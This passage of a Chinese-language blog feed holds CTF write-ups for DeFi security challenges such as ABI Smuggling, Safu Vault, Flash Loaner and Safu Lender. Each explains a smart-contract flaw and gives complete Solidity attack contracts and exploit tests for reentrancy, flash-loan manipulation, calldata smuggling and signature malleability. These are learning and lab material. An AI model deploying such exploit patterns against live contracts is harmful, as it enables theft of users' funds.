return quote        }        const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";        log(`Connecting to uniswap router at mainnet address ${uniswapRouterAddress}`)        const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);        log("Approving all player tokens to be taken from the uniswap router");        await attackToken.approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);        log("Swapping all player tokens for as much WETH as possible.");        await uniswapRouter.exactInputSingle(            [attackToken.address,            weth.address,               3000,            player.address,            PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS            0,            0],            {                gasLimit: 1e7            }        );        await logBalances("Player", player.address)        await logBalances("Uniswap Pool", attackPool.address)        log("Increasing block time by 100 seconds")        await time.increase(100);        log("Getting new quote and approving lending pool for transfer");        const quote = await getQuote(LENDING_POOL_INITIAL_TOKEN_BALANCE);        await attackWeth.approve(attackLendingPool.address, quote);        log("Borrowing funds");        await attackLendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);        await logBalances("Player", player.address);        await logBalances("Lending Pool", attackLendingPool.address)</code></pre><h2 id="ABI-Smuggling"><a href="#ABI-Smuggling" class="headerlink" title="ABI Smuggling"></a>ABI Smuggling</h2><p>通过阅读合约发现想窃取vault中的资金，只能通过sweepFunds方法，而想使用sweepFunds方法只能通过execute方法。那么漏洞很明显存在于execute方法中。</p><pre><code>//deployer调用sweepFundsconst deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);//player调用withdraw;const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);</code></pre><p>在调用execute时，callData为</p><pre><code>//4 bytes Selector//0x00target//0x20actiondata location//0x40actiondata length//0x60actiondata contens</code></pre><p>execute中采用硬编码的方式得到selector，那我们为什么不对calldata动一些手脚呢？</p><pre><code>0x1cff79cd // execute000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512  // address(target)0000000000000000000000000000000000000000000000000000000000000080  // actiondata location 指向0x800000000000000000000000000000000000000000000000000000000000000000  // 随意d9caed1200000000000000000000000000000000000000000000000000000000  // withdraw0000000000000000000000000000000000000000000000000000000000000044  // actiondata length // actiondata contens85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3s</code></pre><pre><code>const attackVault = await vault.connect(player);const attackToken = await token.connect(player);const executeFs = vault.interface.getSighash("execute")const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2); const withdrawSelector =  vault.interface.getSighash("withdraw").slice(2);const bytesLength = ethers.utils.hexZeroPad("0x44", 32).slice(2)const sweepSelector = vault.interface.getSighash("sweepFunds").slice(2);const sweepFundsData = ethers.utils.hexZeroPad(recovery.address, 32).slice(2)              + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) const payload = executeFs +                 target +                 bytesLocation +                 ethers.utils.hexZeroPad("0x0", 32).slice(2) +                withdrawSelector + ethers.utils.hexZeroPad("0x0", 28).slice(2) +                bytesLength +                 sweepSelector +                 sweepFundsData;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mr Steal Yo Crypto-上</title>
      <link href="/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8A/"/>
      <url>/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="Mr-Steal-Yo-Crypto-上"><a href="#Mr-Steal-Yo-Crypto-上" class="headerlink" title="Mr Steal Yo Crypto-上"></a>Mr Steal Yo Crypto-上</h1><h2 id="Jpeg-Sniper"><a href="#Jpeg-Sniper" class="headerlink" title="Jpeg Sniper"></a>Jpeg Sniper</h2><p>我们如果想要铸造nft，仅能通过publicSaleMint方法，但是一个地址最多只能铸造5个代币。</p><p>publicSaleMint方法有一个修饰符isEOA()，绕过她十分简单，只要在构造函数中调用即可。</p><p>那么想要在一次交易中完成，就要有主次两个合约。主合约批量构造次合约，次合约调用publicSaleMint方法。</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import "./FlatLaunchpeg.sol";contract A{    address NFT;    address attacker;    constructor(address _NFT,address _attacker){        NFT = _NFT;        attacker = _attacker;        mint();    }    function mint() public {        uint per = 5;        for(uint amount = 0;amount&lt;=60;){            new a(NFT,attacker,per,amount);            amount = amount+5;        }        new a(NFT,attacker,4,65);    }}contract a{    constructor(address _nft,address attacker,uint per,uint amount){        FlatLaunchpeg nft = FlatLaunchpeg(_nft);        nft.publicSaleMint(per);        for(uint i = 0;i&lt;per;i++){            nft.transferFrom(address(this), attacker, amount+i);        }    }}</code></pre><h2 id="Safu-Vault"><a href="#Safu-Vault" class="headerlink" title="Safu Vault"></a>Safu Vault</h2><p>我们可以看到depositFor()它与deposit()几乎是相同的实现，但是在depositFor()中token是作为参数被输入的，这是一个严重的漏洞。</p><p>我们可以随意的构造safeTransferFrom()。比如在safeTransferFrom()中调用depositFor()进行重入攻击。</p><pre><code>function transferFrom(    address from,    address to,    uint256 _amount) public returns (bool) {    if (count &lt; reentrancy_count) {        count++;        safuVault.depositFor(address(this), uint256(0), owner);        usdc.transfer(address(safuVault), amount);    }    return true;}</code></pre><h2 id="Game-Assets"><a href="#Game-Assets" class="headerlink" title="Game Assets"></a>Game Assets</h2><p>AssetWrapper合约可以随意使用用户的NFT因为</p><pre><code>// set operator of the two game assets to be the wrapper contract        vm.prank(admin);        swordAsset.setOperator(address(assetWrapper));        vm.prank(admin);        shieldAsset.setOperator(address(assetWrapper));</code></pre><p>本题的漏洞在于AssetWrapper合约的wrap()方法。</p><p>在wrap()中采用了铸造assetWrapper代币，再验证的模式，这是十分不合理的。</p><p>当mint时会触发_doSafeBatchTransferAcceptanceCheck()。这个方法中存在外部调用。</p><pre><code>try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response)</code></pre><p>这时我们销毁assetWrapper代币，AssetWrapper合约便会将NFT发给我们。</p><pre><code>    //SPDX-License-Identifier: MIT    pragma solidity ^0.8.4;    import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";    interface AssertWrap{        function wrap(            uint256 nftId,            address assetOwner,            address assetAddress        ) external;        function unwrap(            address assetOwner,            address assetAddress        ) external;    }    contract Attack{        address assertWarp;        address nft1;        address nft2;        int count = 0 ;        constructor(address _warp,address token1,address token2) public{            assertWarp = _warp;            nft1 = token1;            nft2 = token2;        }        function attack() public {            AssertWrap(assertWarp).wrap(0,address(this),nft1);            AssertWrap(assertWarp).wrap(0,address(this),nft2);        }        function onERC1155Received(            address operator,            address from,            uint256 id,            uint256 value,            bytes calldata data        ) external returns (bytes4){            if(count == 0){            AssertWrap(assertWarp).unwrap(address(this), nft1);            count++;            return IERC1155Receiver.onERC1155Received.selector;}            AssertWrap(assertWarp).unwrap(address(this), nft2);            return IERC1155Receiver.onERC1155Received.selector;        }    }</code></pre><h2 id="Free-Lunch"><a href="#Free-Lunch" class="headerlink" title="Free Lunch"></a>Free Lunch</h2><p>SafuMakerV2可以将所有的代币转化成SAFU,并在将来分给xSAFU的持有者。</p><pre><code>safuPair.transfer(address(safuMaker),10_000e18); // 1% of LP</code></pre><p>我们可看到safuMaker中有10000的(USDC-SAFU)LP。那我们是否可以建一个(USDC-SAFU)-SAFU的Pool呢？</p><pre><code>/// solves the challengefunction testChallengeExploit()public{    vm.startPrank(attacker, attacker);   //搞一点(USDC-SAFU)的LP    usdc.approve(address(safuRouter), type(uint).max);    safu.approve(address(safuRouter), type(uint).max);    safuRouter.addLiquidity(        address(usdc),        address(safu),        80e18,        80e18,        0,        0,        attacker,        block.timestamp    );       safuPair = IUniswapV2Pair(safuFactory.getPair(address(usdc), address(safu)));    //建立以个(USDC-SAFU)-SAFU的Pool，并添加流动性。    safuPair.approve(address(safuRouter), type(uint).max);    safuRouter.addLiquidity(        address(safuPair),        address(safu),        safuPair.balanceOf(attacker),        5e18,        0,        0,        address(attacker),        block.timestamp    );       IUniswapV2Pair sifuPair = IUniswapV2Pair(safuFactory.getPair(address(safuPair), address(safu)));    //往safuMaker随意转一点。    sifuPair.transfer(address(safuMaker), 1e18);        /*    本题的关键就在convert()方法中。    safuMaker会将自己所有的代币转化成SAFU，    这在(USDC-SAFU)-SAFU的Pool会有大量的(USDC-SAFU)LP，    这时我们移除(USDC-SAFU)-SAFU流动性会获得大量的(USDC-SAFU)LP,    我们再在USDC-SAFU的Pool中移除流动性即可。    */    safuMaker.convert(address(safuPair), address(safu));       sifuPair.approve(address(safuRouter), type(uint).max);    safuRouter.removeLiquidity(        address(safuPair),        address(safu),        sifuPair.balanceOf(attacker),        0,        0,        address(attacker),        block.timestamp    );       safuRouter.removeLiquidity(        address(usdc),        address(safu),        safuPair.balanceOf(attacker),        0,        0,        address(attacker),        block.timestamp    );    vm.stopPrank();    validation();}</code></pre><h2 id="Safu-Wallet"><a href="#Safu-Wallet" class="headerlink" title="Safu Wallet"></a>Safu Wallet</h2><p>如果我们能够通过修饰符onlymanyowners()，我们就可以破坏合约。</p><p>我们通过观察很容一发现，SafuWallet 合约是代理合约SafuWalletLibrary为逻辑合约。<br>这意味着这意味着我们虽然调用了initWallet()，但是SafuWalletLibrary的状态并未改变。<br>我们依然可以调用initWallet();</p><pre><code>addresses = new address[](1);addresses[0] = attacker;data = abi.encodeWithSignature("initWallet(address[],uint256,uint256)", addresses, 1, type(uint).max);address(safuWalletLibrary).call(data);data = abi.encodeWithSignature("kill(address)", address(attacker));address(safuWalletLibrary).call(data);</code></pre><h2 id="Tasty-Stake"><a href="#Tasty-Stake" class="headerlink" title="Tasty Stake"></a>Tasty Stake</h2><p>这题和Safu Vault的漏洞相似。migrateStake()方法意在将旧的TastyStaking合约中的STEAK和reward代币转移到本合约上。<br>但未对外部调用审查。</p><p>因此我们可以创建一个有migrateWithdraw()方法的合约。</p><pre><code>contract Attack {    address owner;    TastyStaking _tastyStaking;    Token stakingToken;    constructor(address _target, address _stakingToken) {        attacker = msg.sender;        _tastyStaking = TastyStaking(_target);        stakingToken = Token(_stakingToken);    }      function migrateWithdraw(address staker, uint256 amount) external {            }    function pwn() external {        _tastyStaking.migrateStake(address(this), stakingToken.balanceOf(address(_tastyStaking)));        _tastyStaking.withdrawAll(false);        stakingToken.transfer(attacker, stakingToken.balanceOf(address(this)));    }}</code></pre><h2 id="Freebie"><a href="#Freebie" class="headerlink" title="Freebie"></a>Freebie</h2><p>额，这题与Tasty Stake的漏洞一模一样。</p><pre><code>contract Attack {    Token farm;    GovToken govToken;    RewardsAdvisor rewardsAdvisor;    address attacker;    constructor(address _target, address _farm, address _xfarm) {        farm = Token(_farm);        govToken = GovToken(_xfarm);        rewardsAdvisor = RewardsAdvisor(_target);        attacker = msg.sender;    }        function delegatedTransferERC20(address token, address to, uint256 amount) external {            }    function pwn(address _target) external {        uint256 amount = govToken.balanceOf(address(_target)) * uint256(10000) / uint256(1);        rewardsAdvisor.deposit(amount, payable(address(this)), address(this));        rewardsAdvisor.withdraw(govToken.balanceOf(address(this)), attacker, payable(address(this)));    }}</code></pre><h2 id="NFT-Bonanza"><a href="#NFT-Bonanza" class="headerlink" title="NFT Bonanza"></a>NFT Bonanza</h2><pre><code>    vm.prank(admin);    nftA = new Nft721('APES','APES');    vm.prank(admin);    nftB = new Nft721('ApEs','ApEs');</code></pre><p>可以看到我们要盗取的NFT皆为NFT721。</p><p>我们观察buyItem()方法，它有很大的漏洞，当我们买NFT721，即使 _quantity为0，我们依然能得到。因为与_quantity无关。</p><pre><code>IERC721(_nftAddress).safeTransferFrom(_owner, _msgSender(), _tokenId);</code></pre><pre><code>    /// solves the challenge    function testChallengeExploit() public {        vm.startPrank(attacker,attacker);                bonanzaMarketplace.buyItem(address(nftA),0,adminUser,0);        bonanzaMarketplace.buyItem(address(nftB),0,adminUser,0);        vm.stopPrank();        validation();    }</code></pre><h2 id="Inflationary-Net-Worth"><a href="#Inflationary-Net-Worth" class="headerlink" title="Inflationary Net Worth"></a>Inflationary Net Worth</h2><pre><code>// Deposit LP tokens to MasterChef for MUNY allocation.function deposit(uint256 _pid, uint256 _amount) public {    PoolInfo storage pool = poolInfo[_pid];    UserInfo storage user = userInfo[_pid][msg.sender];    updatePool(_pid);    if (user.amount &gt; 0) {        uint256 pending = user.amount.mul(pool.accMunyPerShare).div(1e12).sub(user.rewardDebt);        safeMunyTransfer(msg.sender, pending);    }    pool.lpToken.safeTransferFrom(address(msg.sender), address(this), _amount);    user.amount = user.amount.add(_amount);    user.rewardDebt = user.amount.mul(pool.accMunyPerShare).div(1e12);    emit Deposit(msg.sender, _pid, _amount);}// Withdraw without caring about rewards. EMERGENCY ONLY.function emergencyWithdraw(uint256 _pid) public {    PoolInfo storage pool = poolInfo[_pid];    UserInfo storage user = userInfo[_pid][msg.sender];    pool.lpToken.safeTransfer(address(msg.sender), user.amount);    emit EmergencyWithdraw(msg.sender, _pid, user.amount);    user.amount = 0;    user.rewardDebt = 0;}</code></pre><p>很明显，在deposite与withdraw方法中，并未将销毁5%计算在内。</p><pre><code>// solves the challengefunction testChallengeExploit() public {    vm.startPrank(attacker, attacker);         //减少 MasterChef 内的 lpSupply，直到我们无法提取存入的金额    bool first = true;    uint count;    uint amount;    while (mula.balanceOf(address(masterChef)) &gt; amount || first) {        if (first) {            first = false;        } else {            masterChef.emergencyWithdraw(0);            console.log("balance attacker - withdraw: ", mula.balanceOf(address(attacker)));            console.log("balance masterChef - withdraw: ", mula.balanceOf(address(masterChef)));        }        masterChef.deposit(0, mula.balanceOf(address(attacker)));        ++count;    }    masterChef.withdraw(0, mula.balanceOf(address(masterChef)) - 1);    vm.stopPrank();    validation();}</code></pre><h2 id="Governance-Shenanigans"><a href="#Governance-Shenanigans" class="headerlink" title="Governance Shenanigans"></a>Governance Shenanigans</h2><p>_delegate()和_moveDelegates()的逻辑很奇怪，即使金额为0，我们也能更新 _delegates[delegator]。并且操作后token依然是delegator的。</p><p>那么一个账户给attacker进行delegate后，可以将token转到其它账户中，这样就可以在钱转回来后再次为attacker进行delegate。</p><pre><code>// solves the challengefunction testChallengeExploit() public {    vm.startPrank(attacker);    governanceToken.transfer(o1, governanceToken.balanceOf(attacker));    vm.stopPrank();    for (uint i; i &lt; 3; ++i) {        vm.startPrank(o1);        governanceToken.delegate(attacker);         governanceToken.transfer(o2, governanceToken.balanceOf(o1));        governanceToken.delegate(address(0));         vm.stopPrank();        vm.startPrank(o2);        governanceToken.delegate(attacker);         governanceToken.transfer(o1, governanceToken.balanceOf(o2));        governanceToken.delegate(address(0));        vm.stopPrank();    }    vm.startPrank(o1);    governanceToken.transfer(attacker, governanceToken.balanceOf(o1));    vm.stopPrank();    validation();}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mr Steal Yo Crypto-下</title>
      <link href="/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8B/"/>
      <url>/2023/03/09/Mr%20Steal%20Yo%20Crypto-%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Mr-Steal-Yo-Crypto-下"><a href="#Mr-Steal-Yo-Crypto-下" class="headerlink" title="Mr Steal Yo Crypto-下"></a>Mr Steal Yo Crypto-下</h1><h2 id="Bonding-Curve"><a href="#Bonding-Curve" class="headerlink" title="Bonding Curve"></a>Bonding Curve</h2><p>BancorBondingCurve.sol</p><p>这个合约用来表示债券曲线。</p><p>EminenceCurrencyHelpers.sol</p><p>这个合约中的ContinuousToken合约时核心，用来实现代币。</p><p>EminenceCurrencyBase.sol</p><p>这个合约为EMN ERC20。它有用DAI购买或出售EMN代币的方法。当出售EMN代币时，合约会先销毁EMN代币。</p><p>EminenceCurrency.sol</p><p>这个合约为TOKEN ERC20。它有用EMN购买或出售TOKEN代币的方法。当出售TOKEN代币时，合约会先销毁TOKEN代币。与EminenceCurrencyBase.sol不同的是购买TOKEN时是调用EMN的claim()方法。</p><p>这意味着EminenceCurrency的变化似乎会影响EminenceCurrencyBase的债券曲线，但反之则不然。那么当我们购买TOKEN时，会导致DAI/EMN下降。这时我们可以出售手中的EMN套利，但不影响EMN/TOKEN。</p><pre><code>contract Exploit{    address owner;    IUniswapV2Pair uniPair;     IWETH weth;    Token usdc;    Token dai;    IEminenceCurrency eminenceCurrencyBase;    IEminenceCurrency eminenceCurrency;    constructor(address _dai, address _eminenceCurrencyBase, address _eminenceCurrency, address _uniPair ){        owner = msg.sender;        dai = Token(_dai);        eminenceCurrencyBase = IEminenceCurrency(_eminenceCurrencyBase);        eminenceCurrency = IEminenceCurrency(_eminenceCurrency);        uniPair = IUniswapV2Pair(_uniPair);    }    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {        uint256 daiAmount = dai.balanceOf(address(this));        dai.approve(address(eminenceCurrencyBase), type(uint).max);        eminenceCurrencyBase.approve(address(eminenceCurrency), type(uint).max);        eminenceCurrencyBase.buy(daiAmount, 0);        uint256 eminenceCurrencyBaseAmount = eminenceCurrencyBase.balanceOf(address(this));        uint256 amount_ = eminenceCurrencyBaseAmount / 2;        eminenceCurrency.buy(amount_, 0);        eminenceCurrencyBase.sell(amount_, 0);        uint256 eminenceCurrencyAmount = eminenceCurrency.balanceOf(address(this));        eminenceCurrency.sell(eminenceCurrencyAmount, 0);        eminenceCurrencyBaseAmount = eminenceCurrencyBase.balanceOf(address(this));        eminenceCurrencyBase.sell(eminenceCurrencyBaseAmount, 0);        dai.transfer(address(uniPair), (amount1Out * 103 / 100) + 1);        dai.transfer(owner, dai.balanceOf(address(this)));    }    function pwn() external {        uniPair.swap(0, 999_999e18, address(this), new bytes(1));    }}</code></pre><h2 id="Flash-Loaner"><a href="#Flash-Loaner" class="headerlink" title="Flash Loaner"></a>Flash Loaner</h2><p>通常，当合约有闪电贷功能时，要有一个重入检查，防止使用协议内的金额。但这个合约没有。</p><p>那么我们就能闪贷一资金，再deposit()，这样我们只要付一点手续费就能得到巨额的share token。</p><pre><code>contract Attack {    FlashLoaner flashLoaner;    Token usdc;    IUniswapV2Pair uniPair;    address private attacker;    constructor(address _target, address _usdc, address _uniPair){        flashLoaner = FlashLoaner(_target);        usdc = Token(_usdc);        uniPair = IUniswapV2Pair(_uniPair);        attacker = msg.sender;        usdc.approve(address(flashLoaner), type(uint).max);    }    function flashCallback(uint256 fee, bytes calldata data) external {        flashLoaner.deposit(100_000e18, address(this));        usdc.transfer(address(flashLoaner), fee);     }        function uniswapV2Call(address _address, uint amount0Out, uint amount1Out, bytes memory data) external {        flashLoaner.flash(address(this), usdc.balanceOf(address(flashLoaner)) - 1, new bytes(0));        flashLoaner.redeem(flashLoaner.balanceOf(address(this)), address(this), address(this));        usdc.transfer(address(uniPair), (amount0Out * 103 / 100) + 1);    }    function pwn() external {        uniPair.swap(10_000e18, 0, address(this), new bytes(1));        usdc.transfer(attacker, usdc.balanceOf(address(this)));    }}</code></pre><h2 id="Safu-Swapper"><a href="#Safu-Swapper" class="headerlink" title="Safu Swapper"></a>Safu Swapper</h2><p>safu Pool在添加流动性用的baseAmount，tokenAmount计算，移除流动性时却用amount = IERC20(token).balanceOf(pool);<br>而且在我们以transfer转入代币时合约不会更新baseAmount，tokenAmount。</p><pre><code>pragma solidity ^0.8.4;import {console} from "forge-std/console.sol";import "@openzeppelin/contracts/token/ERC20/IERC20.sol";interface IUniswapV2Pair {    function swap(        uint amount0Out,         uint amount1Out,         address to,         bytes calldata data    ) external;}interface ISafuPool {    function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) external returns (uint);    function swap(address toToken, uint256 amount) external returns (uint);    function removeAllLiquidity() external returns (uint, uint);    function approve(address, uint256) external returns (bool);    function balanceOf(address addr) external returns (uint256);    function totalSupply() external returns (uint256);}contract Attack {    IUniswapV2Pair pair;    ISafuPool safuPool;    IERC20 usdc;    IERC20 safu;    function attack(        address _uniswapPair,         address _safuPool,        address _usdc,        address _safu,        uint256 amount     ) external {        pair = IUniswapV2Pair(_uniswapPair);        safuPool = ISafuPool(_safuPool);        usdc = IERC20(_usdc);        safu = IERC20(_safu);        usdc.approve(address(safuPool),type(uint256).max);        safu.approve(address(safuPool),type(uint256).max);        pair.swap(amount,0,address(this),bytes('not empty'));    }    function uniswapV2Call(        address _sender,         uint256 _amount0,         uint256 _amount1,        bytes calldata _data    ) external {        for (uint i=0; i&lt;5; ++i) {            safuPool.swap(address(safu),8_000*1e18);         }        uint256 safuAmount = safu.balanceOf(address(this));        safuPool.addLiquidity(safuAmount, safuAmount);         uint t = safuPool.balanceOf(address(this));        console.log("My lp :", t);        t = safuPool.totalSupply();        console.log("My lp :", t);        for (uint i=0; i&lt;5; ++i) {            safuPool.swap(address(safu),8_000*1e18);         }        safuAmount = safu.balanceOf(address(this));        safu.transfer(address(safuPool),safuAmount);         usdc.transfer(address(safuPool),600_000*1e18);         safuPool.removeAllLiquidity();         safuPool.addLiquidity(0,0);         safuPool.removeAllLiquidity();         uint256 amountPerRound = safu.balanceOf(address(this))        for (uint i=0; i&lt;10; ++i) {            safuPool.swap(address(usdc), amountPerRound);        }        uint256 loanPlusInterest = (_amount0*(10**18)*1000/997/(10**18))+1;         usdc.transfer(msg.sender,loanPlusInterest);        usdc.transfer(tx.origin,usdc.balanceOf(address(this)));    }}</code></pre><h2 id="Side-Entrance"><a href="#Side-Entrance" class="headerlink" title="Side Entrance"></a>Side Entrance</h2><p>合约为了方便期权买家去行使期权，提供了Uniswap闪电贷，但是合约并未对pair审查。与Free Lunch一样我们为什么不建一个Mytoken(受我们控制)-usdc的Pool呢？</p><pre><code>contract Exploit {    address owner;    Token MyToken;    Token usdc;    IUniswapV2Factory uniFactory;    IUniswapV2Router02 uniRouter;    IUniswapV2Pair usdcMyTokenPair;    IUniswapV2Pair usdcDaiPair;    CallOptions optionsContract;    constructor(address attacker, address _optionsContract, address _factory, address _router, address _usdc, address _usdcDaiPair) {        owner = attacker;        optionsContract = CallOptions(_optionsContract);        MyToken = new Token('My ', 'My ');        MyToken.mint(address(this), 1_000_000e18);        uniRouter = IUniswapV2Router02(_router);        uniFactory = IUniswapV2Factory(_factory);        usdcDaiPair = IUniswapV2Pair(_usdcDaiPair);        usdc = Token(_usdc);        usdc.approve(address(uniRouter), type(uint).max);        MyToken.approve(address(uniRouter), type(uint).max);    }    function uniswapV2Call(address _address, uint amount0Out, uint amount1Out, bytes memory data) external {        uniRouter.addLiquidity(address(usdc), address(MyToken), usdc.balanceOf(address(this)), MyToken.balanceOf(address(this)), 0, 0, address(this), block.timestamp);        usdcMyTokenPair = IUniswapV2Pair(uniFactory.getPair(address(usdc), address(MyToken)));        address to = abi.decode(data, (address));        bytes32 optionId = optionsContract.getLatestOptionId();        uint256 interestAmount = usdc.balanceOf(address(to));        bytes memory _calldata = abi.encode(optionId, to, interestAmount);        usdcMyTokenPair.swap(2_100e18, 0, address(optionsContract), _calldata);        usdcMyTokenPair.approve(address(uniRouter), type(uint).max);        uniRouter.removeLiquidity(address(usdc), address(MyToken), usdcMyTokenPair.balanceOf(address(this))-1, 0, 0, address(this), block.timestamp);        usdc.transfer(address(usdcDaiPair), (amount0Out * 103 / 100) + 1);        usdc.transfer(owner, usdc.balanceOf(address(this)));    }    function pwn(address target) external {        bytes memory _calldata = abi.encode(target);        usdcDaiPair.swap(3_000e18, 0, address(this), _calldata);    }}</code></pre><h2 id="Malleable"><a href="#Malleable" class="headerlink" title="Malleable"></a>Malleable</h2><p>本题需要你对圆锥曲线算法有一定的了解。</p><p>简单来说就是r,s代表曲线上一点，r为x坐标，s为y坐标。但由于对称，s可为正负。<br>这时用v来判断这一点在1，2象限还是3，4象限。</p><pre><code> /// solves the challenge    function testChallengeExploit() public {        vm.startPrank(attacker,attacker);        uint8 v_ = v == 27 ? 28 : 27;        bytes32 s_ = bytes32(            uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) -             uint256(s)        );        treasureVault.sendFundsWithAuth(1e18,0,v_,r,s_);        vm.stopPrank();        validation();    }</code></pre><h2 id="Extractoor"><a href="#Extractoor" class="headerlink" title="Extractoor"></a>Extractoor</h2><p>通过阅读合约，发现只有withdrawTokens()，finalize()，commitEth()能转移ETH，其中withdrawTokens()，finalize()只有owner才能调用。似乎我只有commitEth()可用。</p><p>commitEth()用来接收保证金，并退多的。</p><p>当合约使用msg.value计算时，要防止被循环调用。但很遗憾这个没有做到。它为我们提供了一个循环调用的方法multicall()。</p><pre><code>/// solves the challengefunction testChallengeExploit() public {    vm.startPrank(attacker, attacker);    bytes memory call = abi.encodeWithSignature("commitEth(address)", attacker);    bytes[] memory _data = new bytes[](11);    for (uint i; i &lt; 11; i++) {        _data[i] = call;    }        dutchAuction.multicall{value: 100e18}(_data);    vm.stopPrank();    validation();}</code></pre><h2 id="Opyn-Sesame"><a href="#Opyn-Sesame" class="headerlink" title="Opyn Sesame"></a>Opyn Sesame</h2><p>OptionsContract.sol </p><p>它实现了OptionLogic.sol的逻辑。</p><p>OptionsMarket.sol </p><p>期权市场，用来实现购买期权的功能。</p><p>OptionLogic.sol</p><p>编写了构造期权，使用期权的逻辑功能。</p><p>发现了吗？为了方便，它用exercise()去打包实现_exercise()。它犯了与Extractoor一样的错误！</p><pre><code>// solves the challengefunction testChallengeExploit() public {    vm.startPrank(attacker, attacker);    usdc.approve(address(optionsMarket), 500e18);    optionsMarket.purchase(5e18);    optionsContract.exercise{value: 1 ether}(5e18, addresses);    vm.stopPrank();    validation();}</code></pre><h2 id="Degen-Jackpot"><a href="#Degen-Jackpot" class="headerlink" title="Degen Jackpot"></a>Degen Jackpot</h2><p>当我们通过depositAdditionalToFNFT()方法去创建新NFT是NFT的id是在我们输入的id上加1，这是一个错误的手段，<br>因为它可能不是创建新NFT，而是已有的。这会导致已有的NFT价格改变。</p><pre><code>contract RevestExploiter is ERC1155Receiver {    IERC20 gov;    IRevest revest;    address attacker;    bool triggerCallback;    constructor(address revestAddress, address govAddress) {        revest = IRevest(revestAddress);        attacker = msg.sender;        gov = IERC20(govAddress);        gov.approve(revestAddress, 1e18);    }    function setTrigger(bool _trigger) external {        triggerCallback = _trigger;    }    function onERC1155Received(        address operator,        address from,        uint256 id,        uint256 value,        bytes calldata data    ) external override returns (bytes4) {        if (triggerCallback) {            triggerCallback=false;            revest.depositAdditionalToFNFT(1, 1e18, 1);             revest.withdrawFNFT(2, 100_001);             gov.transfer(attacker,gov.balanceOf(address(this)));         }        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));    }    function onERC1155BatchReceived(        address operator,        address from,        uint256[] calldata ids,        uint256[] calldata values,        bytes calldata data    ) external override returns (bytes4) {        return bytes4(0);    }}</code></pre><pre><code>/// solves the challenge    function testChallengeExploit() public {        vm.startPrank(attacker,attacker);        RevestExploiter exploiter = new RevestExploiter(address(revest),address(gov));        address[] memory recipients = new address[](1);        recipients[0]=address(exploiter);        uint256[] memory quantities = new uint256[](1);        quantities[0]=2;        bytes memory arguments;        IRevest.FNFTConfig memory fnftConfig;        fnftConfig.asset = address(gov);        revest.mintAddressLock(             address(exploiter),            arguments,            recipients,            quantities,            fnftConfig        );        gov.transfer(address(exploiter),1e18);        exploiter.setTrigger(true);        quantities[0]=100_001;        revest.mintAddressLock(            address(exploiter),            arguments,            recipients,            quantities,            fnftConfig        );        vm.stopPrank();        validation();    }</code></pre><h2 id="Fatality"><a href="#Fatality" class="headerlink" title="Fatality"></a>Fatality</h2><h2 id="Safu-Lender"><a href="#Safu-Lender" class="headerlink" title="Safu Lender"></a>Safu Lender</h2><p>首先让我们了解一ERC777与ERC20的差异。当在ERC20中transfer与mint会给与caller去操作的空间。</p><p>显然当使用ERC777要保证caller可信，与先改变状态再执行的模式。</p><pre><code>  err = doTransferOut(asset, msg.sender, localResults.withdrawAmount);        if (err != Error.NO_ERROR) {            // This is safe since it's our first interaction and it didn't do anything if it failed            return fail(err, FailureInfo.WITHDRAW_TRANSFER_OUT_FAILED);        }        // Save market updates        market.blockNumber = getBlockNumber();        market.totalSupply =  localResults.newTotalSupply;        market.supplyRateMantissa = localResults.newSupplyRateMantissa;        market.supplyIndex = localResults.newSupplyIndex;        market.borrowRateMantissa = localResults.newBorrowRateMantissa;        market.borrowIndex = localResults.newBorrowIndex;        // Save user updates        localResults.startingBalance = supplyBalance.principal;        supplyBalance.principal = localResults.userSupplyUpdated;        supplyBalance.interestIndex = localResults.newSupplyIndex;</code></pre><p>很遗憾的是，此合约并没有做到。那我们可以进行重入攻击。</p><pre><code>contract Attack {    address owner;    IUniswapV2Pair usdcBtcPair;    IWETH weth;    Token usdc;    Token777 wbtc;    IMoneyMarket moneyMarket;    constructor(address _wbtc, address _moneyMarket, address _usdcBtcPair) {        owner = msg.sender;        wbtc = Token777(_wbtc);        moneyMarket = IMoneyMarket(_moneyMarket);        usdcBtcPair = IUniswapV2Pair(_usdcBtcPair);        wbtc.approve(address(moneyMarket), type(uint).max);        wbtc.approve(address(usdcBtcPair), type(uint).max);        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));    }    function uniswapV2Call(address _address, uint amount0Out, uint amount1Out, bytes memory data) external {        uint256 wbtcAmount = wbtc.balanceOf(address(this));            moneyMarket.supply(address(wbtc), amount1Out);        moneyMarket.withdraw(address(wbtc), amount1Out);        wbtc.transfer(address(usdcBtcPair), (amount1Out * 103 / 100) + 1);        wbtc.transfer(owner, wbtc.balanceOf(address(this)));            }    function tokensReceived(        address operator,        address from,        address to,        uint256 amount,        bytes calldata userData,        bytes calldata operatorData    ) external {        if 